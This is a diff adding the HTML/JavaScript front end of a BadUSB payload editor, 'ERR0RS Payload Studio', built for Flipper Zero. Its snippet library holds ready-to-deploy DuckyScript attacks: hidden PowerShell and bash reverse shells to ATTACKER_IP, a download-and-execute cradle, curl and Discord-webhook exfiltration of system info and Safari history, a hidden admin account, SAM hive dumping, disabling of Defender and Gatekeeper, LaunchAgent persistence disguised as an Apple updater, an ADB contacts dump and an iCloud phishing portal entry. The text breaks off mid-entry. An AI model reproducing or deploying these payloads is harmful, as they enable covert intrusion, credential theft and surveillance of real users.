@@ -1,0 +1,1184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ERR0RS // PAYLOAD STUDIO</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --void:      #04000a;
+      --panel:     #0c0020;
+      --border:    #1e0040;
+      --purple:    #7b2fbe;
+      --purple-hi: #c084fc;
+      --purple-lo: #2d0a60;
+      --neon:      #bf6fff;
+      --green:     #39ff14;
+      --cyan:      #00f5ff;
+      --red:       #ff2255;
+      --amber:     #ffaa00;
+      --blue:      #4488ff;
+      --orange:    #ff6600;
+      --text:      #d4b8ff;
+      --text-dim:  #4a2870;
+    }
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+    html, body { height:100%; background:var(--void); color:var(--text); font-family:'Share Tech Mono',monospace; overflow:hidden; }
+    body::after { content:''; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.1) 3px,rgba(0,0,0,.1) 4px); pointer-events:none; z-index:9999; }
+
+    /* ── TOP BAR ── */
+    #topbar { height:46px; display:flex; align-items:center; justify-content:space-between; padding:0 16px; background:linear-gradient(90deg,#04000a,#110033 50%,#04000a); border-bottom:1px solid var(--border); z-index:100; position:relative; }
+    .tb-logo { font-family:'Orbitron',monospace; font-size:.65rem; font-weight:900; letter-spacing:4px; color:var(--neon); }
+    .tb-badge { font-family:'Orbitron',monospace; font-size:.5rem; letter-spacing:3px; padding:3px 14px; border-radius:20px; border:1px solid var(--orange); background:rgba(255,102,0,.1); color:var(--orange); }
+    .tb-actions { display:flex; gap:8px; align-items:center; }
+    .tb-btn { font-family:'Rajdhani',sans-serif; font-weight:700; font-size:.58rem; letter-spacing:1.5px; padding:4px 12px; border-radius:4px; cursor:pointer; border:1px solid; transition:all .2s; }
+    .tb-btn:hover { filter:brightness(1.5); }
+    .tb-btn.green  { border-color:var(--green);  color:var(--green);  background:rgba(57,255,20,.06); }
+    .tb-btn.cyan   { border-color:var(--cyan);   color:var(--cyan);   background:rgba(0,245,255,.06); }
+    .tb-btn.purple { border-color:var(--neon);   color:var(--neon);   background:rgba(191,111,255,.06); }
+    .tb-btn.red    { border-color:var(--red);    color:var(--red);    background:rgba(255,34,85,.06); }
+    .tb-btn.amber  { border-color:var(--amber);  color:var(--amber);  background:rgba(255,170,0,.06); }
+
+    /* ── MAIN 3-COLUMN LAYOUT ── */
+    #studio { display:grid; grid-template-columns:230px 1fr 280px; height:calc(100vh - 46px - 32px); }
+
+    /* ── LEFT PANEL: PAYLOAD LIBRARY ── */
+    #lib-panel { border-right:1px solid var(--border); display:flex; flex-direction:column; background:#050010; overflow:hidden; }
+    #lib-header { padding:10px 12px 6px; border-bottom:1px solid var(--border); flex-shrink:0; }
+    .lib-title { font-family:'Orbitron',monospace; font-size:.5rem; letter-spacing:3px; color:var(--orange); margin-bottom:8px; }
+
+    /* Platform tabs */
+    #platform-tabs { display:flex; gap:3px; margin-bottom:6px; }
+    .ptab { flex:1; text-align:center; padding:4px 2px; font-family:'Rajdhani',sans-serif; font-weight:700; font-size:.55rem; letter-spacing:1px; cursor:pointer; border-radius:3px; border:1px solid transparent; transition:all .2s; color:var(--text-dim); }
+    .ptab:hover { color:var(--text); }
+    .ptab.active.win  { border-color:#4488ff; color:#4488ff; background:rgba(68,136,255,.12); }
+    .ptab.active.mac  { border-color:#aaaaaa; color:#ccc;    background:rgba(180,180,180,.08); }
+    .ptab.active.and  { border-color:#39ff14; color:var(--green); background:rgba(57,255,20,.08); }
+    .ptab.active.ios  { border-color:#00f5ff; color:var(--cyan);  background:rgba(0,245,255,.08); }
+
+    /* Category filter */
+    #cat-filter { display:flex; flex-wrap:wrap; gap:3px; }
+    .cat-btn { font-family:'Rajdhani',sans-serif; font-weight:700; font-size:.5rem; letter-spacing:.5px; padding:2px 7px; border-radius:12px; cursor:pointer; border:1px solid var(--border); color:var(--text-dim); background:transparent; transition:all .15s; }
+    .cat-btn:hover { border-color:var(--neon); color:var(--neon); }
+    .cat-btn.active { border-color:var(--orange); color:var(--orange); background:rgba(255,102,0,.1); }
+
+    /* Snippet list */
+    #snippet-list { flex:1; overflow-y:auto; padding:6px 0; }
+    #snippet-list::-webkit-scrollbar { width:3px; }
+    #snippet-list::-webkit-scrollbar-thumb { background:var(--purple-lo); }
+
+    .snippet-card { padding:8px 12px; cursor:pointer; border-left:3px solid transparent; transition:all .15s; }
+    .snippet-card:hover { background:rgba(123,47,190,.1); border-left-color:var(--purple); }
+    .snippet-card.active { background:rgba(123,47,190,.2); border-left-color:var(--neon); }
+    .sc-title { font-size:.65rem; color:var(--text); margin-bottom:2px; }
+    .sc-tags { display:flex; gap:3px; flex-wrap:wrap; }
+    .sc-tag { font-size:.48rem; font-family:'Rajdhani',sans-serif; padding:1px 5px; border-radius:8px; border:1px solid var(--border); color:var(--text-dim); }
+    .sc-diff { font-size:.48rem; font-family:'Rajdhani',sans-serif; padding:1px 5px; border-radius:8px; }
+    .sc-diff.Beginner     { border:1px solid var(--green);  color:var(--green); }
+    .sc-diff.Intermediate { border:1px solid var(--amber);  color:var(--amber); }
+    .sc-diff.Advanced     { border:1px solid var(--red);    color:var(--red); }
+
+    #lib-search { width:100%; background:rgba(255,255,255,.04); border:1px solid var(--border); color:var(--text); font-family:'Share Tech Mono',monospace; font-size:.62rem; padding:4px 8px; border-radius:4px; margin-bottom:6px; }
+    #lib-search:focus { outline:none; border-color:var(--neon); }
+    #lib-search::placeholder { color:var(--text-dim); }
+
+    /* ── CENTER PANEL: EDITOR ── */
+    #editor-panel { display:flex; flex-direction:column; overflow:hidden; }
+    #editor-header { padding:8px 14px; border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; flex-shrink:0; background:#060015; }
+    .eh-left { display:flex; align-items:center; gap:12px; }
+    #payload-name-input { background:rgba(255,255,255,.04); border:1px solid var(--border); color:var(--text); font-family:'Share Tech Mono',monospace; font-size:.7rem; padding:3px 10px; border-radius:4px; width:200px; }
+    #payload-name-input:focus { outline:none; border-color:var(--neon); }
+    .editor-meta { font-size:.55rem; color:var(--text-dim); font-family:'Rajdhani',sans-serif; }
+    .eh-right { display:flex; gap:6px; }
+
+    /* Code editor area */
+    #code-wrap { flex:1; position:relative; overflow:hidden; }
+    #code-editor { width:100%; height:100%; background:#000; border:none; outline:none; color:#d4b8ff; font-family:'Share Tech Mono',monospace; font-size:.72rem; line-height:1.6; padding:12px 14px 12px 54px; resize:none; caret-color:var(--green); overflow-y:auto; }
+    #code-editor::-webkit-scrollbar { width:4px; }
+    #code-editor::-webkit-scrollbar-thumb { background:var(--purple-lo); }
+
+    /* Line numbers */
+    #line-nums { position:absolute; left:0; top:0; bottom:0; width:46px; background:#02000d; border-right:1px solid var(--border); padding:12px 6px; overflow:hidden; pointer-events:none; display:flex; flex-direction:column; gap:0; }
+    .ln { font-size:.72rem; line-height:1.6; color:var(--text-dim); text-align:right; font-family:'Share Tech Mono',monospace; }
+
+    /* ── AUTOSUGGESTION POPUP ── */
+    #suggest-box { position:absolute; background:#0c0020; border:1px solid var(--purple); border-radius:6px; display:none; flex-direction:column; min-width:320px; max-height:200px; overflow-y:auto; z-index:500; box-shadow:0 0 20px rgba(123,47,190,.4); }
+    #suggest-box::-webkit-scrollbar { width:3px; }
+    #suggest-box::-webkit-scrollbar-thumb { background:var(--purple); }
+    .sug-item { padding:6px 12px; cursor:pointer; border-bottom:1px solid rgba(123,47,190,.2); transition:background .1s; }
+    .sug-item:last-child { border-bottom:none; }
+    .sug-item:hover, .sug-item.selected { background:rgba(123,47,190,.3); }
+    .sug-title { font-size:.65rem; color:var(--neon); }
+    .sug-preview { font-size:.58rem; color:var(--text-dim); margin-top:1px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; max-width:300px; }
+    .sug-badge { font-size:.48rem; font-family:'Rajdhani',sans-serif; padding:1px 5px; border-radius:8px; margin-left:6px; border:1px solid var(--orange); color:var(--orange); vertical-align:middle; }
+
+    /* ── BOTTOM STATUS BAR ── */
+    #status-bar { height:32px; display:flex; align-items:center; justify-content:space-between; padding:0 14px; background:#020008; border-top:1px solid var(--border); font-size:.58rem; font-family:'Rajdhani',sans-serif; font-weight:600; letter-spacing:1px; }
+    .sb-item { color:var(--text-dim); }
+    .sb-item span { color:var(--text); }
+    .sb-items-right { display:flex; gap:16px; }
+    #ai-status { color:var(--green); }
+
+    /* ── RIGHT PANEL: EXPLAINER + TOOLS ── */
+    #right-panel { border-left:1px solid var(--border); display:flex; flex-direction:column; background:#050010; overflow:hidden; }
+    .rp-section { border-bottom:1px solid var(--border); }
+    .rp-title { font-family:'Orbitron',monospace; font-size:.48rem; letter-spacing:3px; color:var(--neon); padding:8px 12px 4px; }
+
+    /* Line explainer */
+    #line-explainer { padding:8px 12px; min-height:70px; }
+    #explain-cmd { font-size:.7rem; color:var(--cyan); margin-bottom:4px; }
+    #explain-text { font-size:.62rem; color:var(--text); line-height:1.5; }
+    #explain-line { font-size:.55rem; color:var(--text-dim); font-family:'Rajdhani',sans-serif; margin-top:4px; }
+
+    /* Target info */
+    #target-info { padding:8px 12px; }
+    .ti-row { display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; }
+    .ti-label { font-size:.58rem; font-family:'Rajdhani',sans-serif; color:var(--text-dim); letter-spacing:1px; }
+    .ti-val { font-size:.62rem; color:var(--text); }
+    #target-os-select { background:rgba(255,255,255,.04); border:1px solid var(--border); color:var(--text); font-family:'Share Tech Mono',monospace; font-size:.6rem; padding:2px 6px; border-radius:4px; }
+    #target-os-select:focus { outline:none; border-color:var(--neon); }
+
+    /* Cheatsheet */
+    #cheatsheet { padding:6px 12px; flex:1; overflow-y:auto; }
+    #cheatsheet::-webkit-scrollbar { width:3px; }
+    #cheatsheet::-webkit-scrollbar-thumb { background:var(--purple-lo); }
+    .cs-cmd { display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px solid rgba(123,47,190,.1); }
+    .cs-cmd:last-child { border-bottom:none; }
+    .cs-key { color:var(--amber); font-size:.62rem; min-width:100px; }
+    .cs-desc { color:var(--text-dim); font-size:.58rem; text-align:right; }
+
+    /* Deploy section */
+    #deploy-section { padding:10px 12px; flex-shrink:0; }
+    .deploy-btn { width:100%; padding:7px; font-family:'Orbitron',monospace; font-size:.52rem; letter-spacing:2px; cursor:pointer; border-radius:4px; border:1px solid; text-align:center; transition:all .2s; margin-bottom:6px; }
+    .deploy-btn:hover { filter:brightness(1.4); }
+    .deploy-btn.flipper { border-color:var(--orange); color:var(--orange); background:rgba(255,102,0,.08); }
+    .deploy-btn.copy    { border-color:var(--cyan);   color:var(--cyan);   background:rgba(0,245,255,.06); }
+    .deploy-btn.save    { border-color:var(--green);  color:var(--green);  background:rgba(57,255,20,.06); }
+    #deploy-status { font-size:.58rem; color:var(--text-dim); text-align:center; min-height:18px; }
+  </style>
+</head>
+<body>
+
+<!-- ── TOP BAR ── -->
+<div id="topbar">
+  <div class="tb-logo">ERR0RS // PAYLOAD STUDIO</div>
+  <div class="tb-badge">⚡ AUTOSUGGESTION ACTIVE</div>
+  <div class="tb-actions">
+    <button class="tb-btn amber" onclick="newPayload()">＋ NEW</button>
+    <button class="tb-btn cyan"  onclick="loadPayload()">📂 OPEN</button>
+    <button class="tb-btn green" onclick="savePayload()">💾 SAVE</button>
+    <button class="tb-btn purple" onclick="validatePayload()">✓ VALIDATE</button>
+    <button class="tb-btn red"   onclick="location.href='/'">⬅ DASHBOARD</button>
+  </div>
+</div>
+
+<!-- ── MAIN STUDIO LAYOUT ── -->
+<div id="studio">
+
+  <!-- ══ LEFT: PAYLOAD LIBRARY ══ -->
+  <div id="lib-panel">
+    <div id="lib-header">
+      <div class="lib-title">⚡ PAYLOAD LIBRARY</div>
+      <input id="lib-search" type="text" placeholder="🔍 search payloads..." oninput="filterSnippets()"/>
+      <div id="platform-tabs">
+        <div class="ptab win active" onclick="setPlatform('windows')">WIN</div>
+        <div class="ptab mac"       onclick="setPlatform('macos')">MAC</div>
+        <div class="ptab and"       onclick="setPlatform('android')">APK</div>
+        <div class="ptab ios"       onclick="setPlatform('ios')">iOS</div>
+      </div>
+      <div id="cat-filter"></div>
+    </div>
+    <div id="snippet-list"></div>
+  </div>
+
+  <!-- ══ CENTER: EDITOR ══ -->
+  <div id="editor-panel">
+    <div id="editor-header">
+      <div class="eh-left">
+        <input id="payload-name-input" type="text" placeholder="payload_name.txt" value="new_payload.txt"/>
+        <span class="editor-meta" id="editor-meta">0 lines · 0 chars · DuckyScript</span>
+      </div>
+      <div class="eh-right">
+        <button class="tb-btn amber" onclick="insertSnippet(null)" title="Insert snippet at cursor">+ SNIPPET</button>
+        <button class="tb-btn cyan" onclick="toggleTeachMode()" id="teach-mode-btn">📚 TEACH: OFF</button>
+      </div>
+    </div>
+
+    <!-- Editor + line numbers -->
+    <div id="code-wrap">
+      <div id="line-nums"></div>
+      <textarea id="code-editor"
+        spellcheck="false"
+        autocorrect="off"
+        autocapitalize="off"
+        placeholder="REM Start typing your payload here...&#10;REM Press TAB or CTRL+SPACE for autosuggestion&#10;REM Select a snippet from the library on the left&#10;&#10;DELAY 2000&#10;"
+        oninput="onEditorInput()"
+        onkeydown="onEditorKey(event)"
+        onkeyup="onEditorKeyUp(event)"
+        onclick="onEditorClick()"
+      ></textarea>
+      <div id="suggest-box"></div>
+    </div>
+  </div>
+
+  <!-- ══ RIGHT: EXPLAINER + TOOLS ══ -->
+  <div id="right-panel">
+
+    <div class="rp-section">
+      <div class="rp-title">🔍 LINE EXPLAINER</div>
+      <div id="line-explainer">
+        <div id="explain-cmd">No line selected</div>
+        <div id="explain-text">Click a line or start typing to see what it does</div>
+        <div id="explain-line"></div>
+      </div>
+    </div>
+
+    <div class="rp-section">
+      <div class="rp-title">🎯 TARGET CONFIG</div>
+      <div id="target-info">
+        <div class="ti-row">
+          <span class="ti-label">OS TARGET</span>
+          <select id="target-os-select" onchange="onTargetChange()">
+            <option value="windows">Windows 10/11</option>
+            <option value="windows7">Windows 7/8</option>
+            <option value="macos">macOS</option>
+            <option value="android">Android (HID)</option>
+            <option value="android_adb">Android (ADB)</option>
+            <option value="ios">iOS (Evil Portal)</option>
+            <option value="linux">Linux</option>
+            <option value="chromeos">ChromeOS</option>
+          </select>
+        </div>
+        <div class="ti-row">
+          <span class="ti-label">FORMAT</span>
+          <span class="ti-val" id="format-label">DuckyScript 1.0</span>
+        </div>
+        <div class="ti-row">
+          <span class="ti-label">DEVICE</span>
+          <span class="ti-val" id="device-label">Flipper Zero</span>
+        </div>
+        <div class="ti-row">
+          <span class="ti-label">KEYBOARD</span>
+          <span class="ti-val" id="kb-label">en-US</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="rp-section" style="flex:1;overflow:hidden;display:flex;flex-direction:column;">
+      <div class="rp-title">📖 DUCKY CHEATSHEET</div>
+      <div id="cheatsheet"></div>
+    </div>
+
+    <div id="deploy-section">
+      <button class="deploy-btn flipper" onclick="deployToFlipper()">🐬 DEPLOY → FLIPPER SD</button>
+      <button class="deploy-btn copy"    onclick="copyPayload()">📋 COPY PAYLOAD</button>
+      <button class="deploy-btn save"    onclick="savePayload()">💾 DOWNLOAD .txt</button>
+      <div id="deploy-status"></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ── BOTTOM STATUS BAR ── -->
+<div id="status-bar">
+  <div class="sb-item">LINE: <span id="sb-line">1</span> · COL: <span id="sb-col">1</span></div>
+  <div class="sb-items-right">
+    <div class="sb-item">PLATFORM: <span id="sb-platform">WINDOWS</span></div>
+    <div class="sb-item">SNIPPETS: <span id="sb-count">0</span></div>
+    <div class="sb-item" id="ai-status">⚡ ERR0RS AI READY</div>
+  </div>
+</div>
+
+<script>
+// ══════════════════════════════════════════════════════════
+// PAYLOAD SNIPPET LIBRARY — 21 cards across 4 platforms
+// Source: src/tools/payload_studio/snippets.py
+// ══════════════════════════════════════════════════════════
+const SNIPPETS = {
+  windows: [
+    {
+      id: "badusb_win_ps_hidden",
+      title: "Hidden PowerShell Reverse Shell",
+      category: "shell",
+      difficulty: "Intermediate",
+      tags: ["powershell", "reverse shell", "windows", "hidden", "tcpclient"],
+      desc: "Opens hidden PowerShell via Win+R and connects back to attacker. No window visible.",
+      platform: "windows",
+      code: "REM Hidden PowerShell reverse shell via Win+R\nREM Replace ATTACKER_IP and PORT before deploying\nDELAY 1000\nGUI r\nDELAY 600\nSTRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r+[char]26);$s.Write($rb,0,$rb.Length)};$c.Close()\"\nENTER",
+    },
+    {
+      id: "badusb_win_open_cmd",
+      title: "Open Elevated CMD (UAC Bypass)",
+      category: "privesc",
+      difficulty: "Intermediate",
+      tags: ["cmd", "uac", "admin", "elevate", "windows"],
+      desc: "Opens elevated CMD prompt using Ctrl+Shift+Enter UAC bypass trick.",
+      platform: "windows",
+      code: "REM Open elevated CMD silently via UAC bypass\nDELAY 500\nGUI r\nDELAY 600\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 1200\nLEFTARROW\nENTER\nDELAY 1500",
+    },
+    {
+      id: "badusb_win_admin",
+      title: "Add Hidden Admin Account",
+      category: "persistence",
+      difficulty: "Beginner",
+      tags: ["net user", "admin", "account", "windows", "persistence"],
+      desc: "Creates a new local admin user. Replace username/password before use.",
+      platform: "windows",
+      code: "REM Add hidden admin account \u2014 replace USERNAME and PASSWORD\nDELAY 1000\nGUI r\nDELAY 600\nSTRING cmd /c net user USERNAME P@ssw0rd123 /add & net localgroup administrators USERNAME /add\nENTER",
+    },
+    {
+      id: "badusb_win_exfil_webhook",
+      title: "Exfil via Discord Webhook",
+      category: "exfil",
+      difficulty: "Intermediate",
+      tags: ["discord", "webhook", "exfil", "sysinfo", "powershell"],
+      desc: "Sends hostname, username, and IP info to a Discord webhook. Replace WEBHOOK_URL.",
+      platform: "windows",
+      code: "REM Exfil system info via Discord webhook\nREM Replace WEBHOOK_URL with real Discord webhook\nDELAY 500\nGUI r\nDELAY 600\nSTRING powershell -w hidden -c \"$d=@{username='ERR0RS';content=\"$env:COMPUTERNAME | $env:USERNAME | $(ipconfig|Select-String 'IPv4')\"};Invoke-RestMethod -Uri 'WEBHOOK_URL' -Method Post -Body ($d|ConvertTo-Json) -ContentType 'application/json'\"\nENTER",
+    },
+    {
+      id: "badusb_win_persistence_reg",
+      title: "Registry Run Key Persistence",
+      category: "persistence",
+      difficulty: "Intermediate",
+      tags: ["registry", "run key", "persistence", "startup", "windows"],
+      desc: "Adds a registry run key so a script executes every time the user logs in.",
+      platform: "windows",
+      code: "REM Registry Run Key persistence \u2014 edit path before use\nDELAY 1000\nGUI r\nDELAY 600\nSTRING powershell -w hidden -c \"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d 'powershell -ep bypass -w hidden -f C:\\Users\\Public\\update.ps1' /f\"\nENTER",
+    },
+    {
+      id: "badusb_win_download_exec",
+      title: "Download & Execute Payload",
+      category: "shell",
+      difficulty: "Intermediate",
+      tags: ["download", "execute", "iex", "cradle", "powershell"],
+      desc: "Downloads and executes a remote PowerShell script. Classic IEX cradle. Replace ATTACKER_IP.",
+      platform: "windows",
+      code: "REM Download & Execute payload \u2014 replace ATTACKER_IP\nDELAY 1000\nGUI r\nDELAY 600\nSTRING powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')\"\nENTER",
+    },
+    {
+      id: "badusb_win_dump_loot",
+      title: "Dump SAM & SYSTEM Hives",
+      category: "credentials",
+      difficulty: "Advanced",
+      tags: ["sam", "system", "credentials", "hash", "dump"],
+      desc: "Saves SAM and SYSTEM registry hives for offline hash extraction with Impacket/Secretsdump.",
+      platform: "windows",
+      code: "REM Dump SAM + SYSTEM for offline hash extraction\nREM Requires admin \u2014 use 'Open Elevated CMD' snippet first\nDELAY 1000\nSTRING reg save hklm\\sam C:\\Windows\\Temp\\sam.bak\nENTER\nDELAY 800\nSTRING reg save hklm\\system C:\\Windows\\Temp\\sys.bak\nENTER\nDELAY 500\nSTRING echo Done. Retrieve: C:\\Windows\\Temp\\sam.bak and sys.bak\nENTER",
+    },
+    {
+      id: "badusb_win_disable_defender",
+      title: "Disable Windows Defender (PS)",
+      category: "evasion",
+      difficulty: "Advanced",
+      tags: ["defender", "antivirus", "disable", "evasion", "powershell"],
+      desc: "Disables Windows Defender real-time monitoring via PowerShell. Requires admin.",
+      platform: "windows",
+      code: "REM Disable Defender \u2014 requires admin PowerShell\nDELAY 1000\nSTRING Set-MpPreference -DisableRealtimeMonitoring $true\nENTER\nDELAY 500\nSTRING Set-MpPreference -DisableIOAVProtection $true\nENTER\nDELAY 500\nSTRING Set-MpPreference -DisableBehaviorMonitoring $true\nENTER",
+    },
+    {
+      id: "badusb_win_lockscreen",
+      title: "Lock Workstation",
+      category: "disruption",
+      difficulty: "Beginner",
+      tags: ["lock", "screen", "disrupt", "windows"],
+      desc: "Locks the Windows workstation immediately using Win+L shortcut.",
+      platform: "windows",
+      code: "REM Lock Windows workstation immediately\nDELAY 500\nGUI l",
+    },
+  ],
+  macos: [
+    {
+      id: "badusb_mac_rev_shell",
+      title: "macOS Bash Reverse Shell",
+      category: "shell",
+      difficulty: "Intermediate",
+      tags: ["bash", "reverse shell", "macos", "terminal", "spotlight"],
+      desc: "Opens Terminal via Spotlight and fires a bash reverse shell. Replace ATTACKER_IP.",
+      platform: "macos",
+      code: "REM macOS reverse shell via Spotlight \u2192 Terminal\nREM Replace ATTACKER_IP and PORT\nDELAY 500\nGUI SPACE\nDELAY 900\nSTRING terminal\nDELAY 700\nENTER\nDELAY 1500\nSTRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\nENTER",
+    },
+    {
+      id: "badusb_mac_exfil_sysinfo",
+      title: "Exfil macOS System Info",
+      category: "recon",
+      difficulty: "Intermediate",
+      tags: ["exfil", "sysinfo", "curl", "macos", "recon"],
+      desc: "Gathers hostname, user, IP, and sends to attacker via curl. Replace ATTACKER_IP.",
+      platform: "macos",
+      code: "REM Exfil macOS system info via HTTP POST\nREM Replace ATTACKER_IP\nDELAY 500\nGUI SPACE\nDELAY 900\nSTRING terminal\nDELAY 700\nENTER\nDELAY 1500\nSTRING curl -X POST http://ATTACKER_IP/loot -d \"host=$(hostname)&user=$(whoami)&ip=$(ipconfig getifaddr en0)\"\nENTER",
+    },
+    {
+      id: "badusb_mac_persistence",
+      title: "macOS LaunchAgent Persistence",
+      category: "persistence",
+      difficulty: "Advanced",
+      tags: ["launchagent", "persistence", "plist", "macos", "startup"],
+      desc: "Installs a LaunchAgent plist to auto-run a reverse shell on login. Replace ATTACKER_IP.",
+      platform: "macos",
+      code: "REM macOS LaunchAgent persistence \u2014 replace ATTACKER_IP\nDELAY 500\nGUI SPACE\nDELAY 900\nSTRING terminal\nDELAY 700\nENTER\nDELAY 1500\nSTRING cat > ~/Library/LaunchAgents/com.apple.update.plist << 'EOF'\nENTER\nSTRING <?xml version=\"1.0\" encoding=\"UTF-8\"?>\nENTER\nSTRING <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\nENTER\nSTRING <plist version=\"1.0\"><dict><key>Label</key><string>com.apple.update</string><key>ProgramArguments</key><array><string>bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</string></array><key>RunAtLoad</key><true/></dict></plist>\nENTER\nSTRING EOF\nENTER\nDELAY 500\nSTRING launchctl load ~/Library/LaunchAgents/com.apple.update.plist\nENTER",
+    },
+    {
+      id: "badusb_mac_disable_gatekeeper",
+      title: "Disable Gatekeeper (macOS)",
+      category: "evasion",
+      difficulty: "Advanced",
+      tags: ["gatekeeper", "disable", "macos", "evasion", "spctl"],
+      desc: "Disables macOS Gatekeeper to allow unsigned apps. Requires password prompt.",
+      platform: "macos",
+      code: "REM Disable macOS Gatekeeper \u2014 requires admin password\nDELAY 500\nGUI SPACE\nDELAY 900\nSTRING terminal\nDELAY 700\nENTER\nDELAY 1500\nSTRING sudo spctl --master-disable\nENTER\nDELAY 2000\nREM Enter sudo password here if needed\nREM STRING your_password\nREM ENTER",
+    },
+    {
+      id: "badusb_mac_safari_history",
+      title: "Exfil Safari History",
+      category: "surveillance",
+      difficulty: "Intermediate",
+      tags: ["safari", "history", "exfil", "macos", "browser"],
+      desc: "Copies Safari browsing history database to /tmp for exfiltration. Replace ATTACKER_IP.",
+      platform: "macos",
+      code: "REM Exfil Safari history \u2014 replace ATTACKER_IP\nDELAY 500\nGUI SPACE\nDELAY 900\nSTRING terminal\nDELAY 700\nENTER\nDELAY 1500\nSTRING cp ~/Library/Safari/History.db /tmp/hist.db && curl -X POST http://ATTACKER_IP/loot -F 'file=@/tmp/hist.db'\nENTER",
+    },
+  ],
+  android: [
+    {
+      id: "badusb_android_rev_shell",
+      title: "Android ADB Reverse Shell",
+      category: "shell",
+      difficulty: "Advanced",
+      tags: ["adb", "android", "reverse shell", "shell", "usb debug"],
+      desc: "Sends an ADB shell command via HID if USB debugging is enabled. Replace ATTACKER_IP.",
+      platform: "android",
+      code: "REM Android ADB reverse shell\nREM Requires USB Debugging ENABLED on target device\nREM Replace ATTACKER_IP and PORT\nDELAY 2000\nSTRING adb shell am start --user 0 -a android.intent.action.VIEW\nENTER\nDELAY 1000\nSTRING adb shell bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &'\nENTER",
+    },
+    {
+      id: "badusb_android_exfil_contacts",
+      title: "Exfil Android Contacts (ADB)",
+      category: "exfil",
+      difficulty: "Advanced",
+      tags: ["contacts", "exfil", "adb", "android", "content provider"],
+      desc: "Dumps Android contacts database via ADB content provider query.",
+      platform: "android",
+      code: "REM Exfil Android contacts via ADB\nDELAY 1000\nSTRING adb shell content query --uri content://contacts/phones/ --projection display_name:number > /sdcard/contacts.txt\nENTER\nDELAY 1500\nSTRING adb pull /sdcard/contacts.txt ./contacts.txt\nENTER",
+    },
+    {
+      id: "badusb_android_lock",
+      title: "Lock Android Screen",
+      category: "disruption",
+      difficulty: "Beginner",
+      tags: ["lock", "screen", "android", "keyevent"],
+      desc: "Locks the Android screen using ADB keyevent (power button).",
+      platform: "android",
+      code: "REM Lock Android screen via ADB\nDELAY 500\nSTRING adb shell input keyevent 26\nENTER",
+    },
+    {
+      id: "badusb_android_sysinfo",
+      title: "Dump Android System Info",
+      category: "recon",
+      difficulty: "Beginner",
+      tags: ["sysinfo", "recon", "android", "adb", "device"],
+      desc: "Dumps Android device info, OS version, IMEI, and installed apps via ADB.",
+      platform: "android",
+      code: "REM Dump Android system info\nDELAY 500\nSTRING adb shell getprop ro.product.model && adb shell getprop ro.build.version.release && adb shell service call iphonesubinfo 1\nENTER\nDELAY 1000\nSTRING adb shell pm list packages -3\nENTER",
+    },
+  ],
+  ios: [
+    {
+      id: "ios_vector_overview",
+      title: "iOS Attack Vector Overview",
+      category: "utility",
+      difficulty: "Beginner",
+      tags: ["ios", "iphone", "attack surface", "overview", "evil portal"],
+      desc: "Reference card: iOS attack surface \u2014 Evil Portal, MDM profiles, Lightning cable attacks.",
+      platform: "ios",
+      code: "REM iOS ATTACK VECTOR OVERVIEW\nREM \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nREM\nREM VECTOR 1: Evil Portal (WiFi Pineapple / Flipper + WiFi Board)\nREM   Target connects to rogue AP \u2192 captive portal prompts credentials\nREM   Tool: WiFi Pineapple PineAP module / Flipper WiFi dev board\nREM\nREM VECTOR 2: Malicious MDM Profile\nREM   Host a .mobileconfig file \u2192 tricks user into installing\nREM   Can install CA certs, VPN configs, force managed apps\nREM   Tool: iPhone Backup Analyzer / Apple Configurator\nREM\nREM VECTOR 3: O.MG Cable / Lightning HID\nREM   Looks like a real lightning cable, runs DuckyScript\nREM   Works while iOS is unlocked\nREM\nREM VECTOR 4: AirDrop Phishing\nREM   Broadcast malicious contact card or image\nREM   Works in open AirDrop mode\nREM \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nREM No DuckyScript \u2014 reference note only",
+    },
+    {
+      id: "ios_evil_portal_template",
+      title: "Evil Portal \u2014 iOS iCloud Login",
+      category: "credentials",
+      difficulty: "Intermediate",
+      tags: ["evil portal", "ios", "icloud", "phishing", "captive portal"],
+      desc: "Evil Portal template that mimics an iCloud login page. Deploy via Flipper WiFi board.",
+      platform: "ios",
